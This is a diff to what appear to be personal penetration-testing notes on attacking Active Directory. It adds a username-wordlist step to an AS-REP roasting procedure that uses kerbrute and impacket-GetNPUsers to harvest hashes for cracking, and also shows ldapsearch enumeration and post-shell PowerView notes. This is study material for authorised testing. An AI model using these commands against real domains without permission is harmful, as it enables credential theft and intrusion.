@@ -40,9 +40,10 @@ ldapsearch -h <IP> -x -b “DC=cascade,DC=local” ‘(objectClass=person)’
 ```
 ## AS-REP Roasting (Authentication Reply Roasting)
 1. If pre-authentication is disabled, and we provide a list of userlists to the domain controller (AS-REQ), the DC will grant us TGT. If the passwords are weak, we can crack the TGT and gain access. We can use krebrute, impacket, or crackmap
-2. `kerbrute userenum --dc $IP -d DOMAIN.NAME user.txt` user.txt is a userlist that we have created to authenticate to DC.
-3. `impacket-GetNPUsers -userfile user.txt -dc-ip $IP DOMAIN.NAME/`
-4. Crack the hash
+2. If we dont find some misconfiguration or user name try using this username list `/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt`
+3. `kerbrute userenum --dc $IP -d DOMAIN.NAME user.txt` user.txt is a userlist that we have created to authenticate to DC.
+4. `impacket-GetNPUsers -userfile user.txt -dc-ip $IP DOMAIN.NAME/`
+5. Crack the hash
 ## After initial shell, credentials or some password
 1. Enumerate the initial target using powerview. Trasfer file to target.
 2. https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
